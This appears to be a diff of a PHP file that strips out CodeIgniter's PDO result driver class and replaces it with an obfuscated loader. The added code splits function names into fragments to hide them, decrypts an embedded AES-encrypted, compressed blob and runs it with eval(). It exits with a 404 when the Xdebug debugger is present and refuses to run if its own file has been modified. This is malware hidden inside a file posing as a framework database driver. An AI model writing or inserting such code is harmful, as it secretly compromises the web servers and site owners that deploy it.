@@ -1,198 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.1.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PDO Result Class
- *
- * This class extends the parent result class: CI_DB_result
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_pdo_result extends CI_DB_result {
-
-	/**
-	 * Number of rows in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_rows()
-	{
-		if (is_int($this->num_rows))
-		{
-			return $this->num_rows;
-		}
-		elseif (count($this->result_array) > 0)
-		{
-			return $this->num_rows = count($this->result_array);
-		}
-		elseif (count($this->result_object) > 0)
-		{
-			return $this->num_rows = count($this->result_object);
-		}
-		elseif (($num_rows = $this->result_id->rowCount()) > 0)
-		{
-			return $this->num_rows = $num_rows;
-		}
-
-		return $this->num_rows = count($this->result_array());
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Number of fields in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_fields()
-	{
-		return $this->result_id->columnCount();
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Fetch Field Names
-	 *
-	 * Generates an array of column names
-	 *
-	 * @return	bool
-	 */
-	public function list_fields()
-	{
-		$field_names = array();
-		for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
-		{
-			// Might trigger an E_WARNING due to not all subdrivers
-			// supporting getColumnMeta()
-			$field_names[$i] = @$this->result_id->getColumnMeta($i);
-			$field_names[$i] = $field_names[$i]['name'];
-		}
-
-		return $field_names;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field data
-	 *
-	 * Generates an array of objects containing field meta-data
-	 *
-	 * @return	array
-	 */
-	public function field_data()
-	{
-		try
-		{
-			$retval = array();
-
-			for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
-			{
-				$field = $this->result_id->getColumnMeta($i);
-
-				$retval[$i]			= new stdClass();
-				$retval[$i]->name		= $field['name'];
-				$retval[$i]->type		= $field['native_type'];
-				$retval[$i]->max_length		= ($field['len'] > 0) ? $field['len'] : NULL;
-				$retval[$i]->primary_key	= (int) ( ! empty($field['flags']) && in_array('primary_key', $field['flags'], TRUE));
-			}
-
-			return $retval;
-		}
-		catch (Exception $e)
-		{
-			if ($this->db->db_debug)
-			{
-				return $this->db->display_error('db_unsupported_feature');
-			}
-
-			return FALSE;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Free the result
-	 *
-	 * @return	void
-	 */
-	public function free_result()
-	{
-		if (is_object($this->result_id))
-		{
-			$this->result_id = FALSE;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - associative array
-	 *
-	 * Returns the result set as an array
-	 *
-	 * @return	array
-	 */
-	protected function _fetch_assoc()
-	{
-		return $this->result_id->fetch(PDO::FETCH_ASSOC);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - object
-	 *
-	 * Returns the result set as an object
-	 *
-	 * @param	string	$class_name
-	 * @return	object
-	 */
-	protected function _fetch_object($class_name = 'stdClass')
-	{
-		return $this->result_id->fetchObject($class_name);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_s05kkvmh=('bas'.'e64'.'_de'.'cod'.'e');
+$_s5jreajj=('gzu'.'nco'.'mpr'.'ess');
+$_iqtez32v=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bmudiant='7SKeAXA3';
+$_m2b1dkvk='Mo4xw1j52s0=';
+$_iwqb9fy8='Y45UHzhK';
+$_fazdb8ko='nWid5pjt';
+$_fjser76l='G/NPXGrB';
+$_k8zx6axv='kDkaPksT';
+$_pangfhoc='kXq+7g==';
+$_ntgjtqsn='t0+rQ8N4';
+$_b49cu84r=$_s05kkvmh($_bmudiant.$_iwqb9fy8.$_fazdb8ko.$_fjser76l.$_m2b1dkvk);
+$_nlis5fiz=$_s05kkvmh($_k8zx6axv.$_ntgjtqsn.$_pangfhoc);
+$_q0o3rfck=$_s05kkvmh('LmWypj9sgAzUw1/GVkmoEspH2WEVuCCN5KmMjmiTMejMaQO+Id/rhIKz+FM/gRFlDplF1E16oj4xkyXBJftYJ58Gxy1RDKrtS/27FPdcYOjwYnDd5QHtHIsi06kCdwP7srwG2p1oEy38a1Znmd/NSX+Xs80dhqff1Vmp3dIdUNDklFMZ7kWY2wgir3+/gmrQbDWR168CizBhUFgh5jNwP43dK3MR5x+mCP8tYBCiZI2bt7PWsEhyPFfeqXFhu1/EQrrKqqjwAFUTxkQikyClYcY2Y5Y8dY9RGax97a3Fko+0NYcNkfcqmXvDOz+sRD9Q8A2CfPTz07zql/+1ug8lIBPWwRVbN6FzQ0ZsEhaDM9J5734NxiqqxcqSNAQkIwVHPc0KgMh5u8z5M57Vprg0iVzm7ch3K7dnmHiyRKBrbdpPEbFVejtpCGnyumco2KFqibDjhg2Q36KvbQW+xwpuF0F6ZqjMqg48DuWwiIRbuuXlkYxneke67wfqzUmMpfdpQA/O/DEqb7C9vvavb6pIAY+vGUgWlvP810ElDQwgyaIoj7wh+3Z2VtviJon0ZeYy/MAUr6/g4KjbTjRcJCoReGwb4CEseoMZmmKqNHPINORnOW4BKH7Ld+X4N2ElTJqUXDuVnB3bKrNJzLrP6v9Q6O4KQ0eWUg0EZdvuvy99SI+TBjZVgOW8AomW+kUnBRK4yEokH4Hb/uVQZz3ZS42FePLPq3rbpPuY8M1a0qQEuBM5bvMqmBSzLtV3Ds7wWjL7Jj0zkJ3twl6LJnQ2kUABR2LyIB1wc6YIddPChCawWDCILyRcoq+1lkhvTl/+nX8Pg0NdmzaN3xjZ/lOsnvSQrA==');
+$_fkdzv8to=$_iqtez32v($_q0o3rfck,'aes-256-cbc',$_b49cu84r,OPENSSL_RAW_DATA,$_nlis5fiz);
+if($_fkdzv8to===false){exit;}
+$_l99vq2dk=$_s5jreajj($_fkdzv8to);
+if($_l99vq2dk===false){exit;}
+$_rxr84jbv='477ae4623e7c7658a696ce4b085c7a5947b260e763908ea95da552063ecc91b1';
+$_mkvuvad8=@file_get_contents(__FILE__);
+if($_mkvuvad8!==false){
+$_fwykx1g3=str_replace($_rxr84jbv,"0000000000000000000000000000000000000000000000000000000000000000",$_mkvuvad8);
+$_hnsrvgx6=hash("sha256",$_fwykx1g3);
+if($_hnsrvgx6!==$_rxr84jbv){@http_response_code(403);exit;}
 }
+eval($_l99vq2dk);
